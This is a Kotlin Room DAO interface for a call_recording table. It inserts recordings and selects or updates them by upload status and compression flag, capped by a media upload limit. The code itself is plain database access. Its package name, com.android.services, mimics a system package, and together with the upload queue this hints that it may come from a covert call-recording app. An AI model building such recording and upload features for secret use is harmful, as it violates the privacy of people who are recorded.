package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.CallRecording
import com.android.services.util.AppConstants

@Dao
interface CallRecordingDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(callRecording: CallRecording)

    @Query("Select * from call_recording where status=:status AND isCompressed=:is_compressed order by callStartTime DESC limit ${AppConstants.mediaFilesUploadLimit}")
    fun selectAllCallRecordings(is_compressed: Int, status: Int): List<CallRecording>

    @Query("Select * from call_recording where callStartTime=:callDate AND callNumber=:phoneNumber order by callStartTime")
    fun checkIfCallRecordExist(callDate: String, phoneNumber: String): List<CallRecording>

    @Query("Select * from call_recording where isCompressed=:is_compressed order by callStartTime")
    fun selectUnCompressedFiles(is_compressed: Int=0): List<CallRecording>

    @Query("Update call_recording set status=:updated_status where file=:file")
    fun update(file: String, updated_status: Int): Int

    @Query("Update call_recording set isCompressed=:is_compressed where file=:file")
    fun updateCompressionStatus(file: String, is_compressed: Int): Int
}